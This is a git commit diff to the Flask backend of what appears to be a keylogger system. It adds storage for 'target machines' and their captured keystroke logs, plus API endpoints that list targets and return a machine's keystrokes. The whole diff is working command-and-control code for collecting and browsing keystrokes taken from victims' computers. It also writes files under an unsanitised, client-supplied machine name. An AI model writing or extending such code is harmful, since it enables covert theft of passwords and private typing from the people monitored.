4ccd66694f20c7939e0b01506cd9ce264a3a5049
AriDurlacher <aridurlacher@gmail.com>
2025-09-03 12:19:31 +0300

    adding function "get_target_machines_list" return list of target machine and adding function "get_keystrokes_machine" return data by key

--- backend/app.py
+++ backend/app.py
@@ -3,7 +3,8 @@ import time
 import os
 
 app = Flask(__name__)
-
+target_machine = []
+keystrokes_data = {}
 
 @app.route("/")
 def home():
@@ -19,20 +20,39 @@ def upload():
     data = request.get_json()
     if not data or "machine" not in data or "data" not in data:
         return jsonify({"error": "Invalid payload"}), 400
+
     machine = data["machine"]
     log_data = data["data"]
 
-    machine_folder = os.path.join(data, machine)
+    machine_folder = os.path.join("data", machine)
     if not os.path.exists(machine_folder):
         os.makedirs(machine_folder)
 
+    if machine not in target_machine:
+         target_machine.append(machine)
+
     filename = generate_log_filename()
     file_path = os.path.join(machine_folder, filename)
-
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(log_data)
 
+    if machine not in keystrokes_data:
+        keystrokes_data[machine] = {}
+    keystrokes_data[machine][filename] = log_data
+
     return jsonify({"status": "success", "file": file_path}), 200
+
+
+@app.route('/api/get_target_machines_list/', methods=['GET'])
+def get_target_machines_list():
+    return jsonify(target_machine)
+
+
+@app.route('/api/get_keystrokes_machine/<machine>', methods=['GET'])
+def get_keystrokes_machine(machine):
+    if machine not in keystrokes_data:
+        return jsonify({"error": "Machine not found"}), 404
+    return jsonify({machine: keystrokes_data[machine]})
 
 
 if __name__ == "__main__":
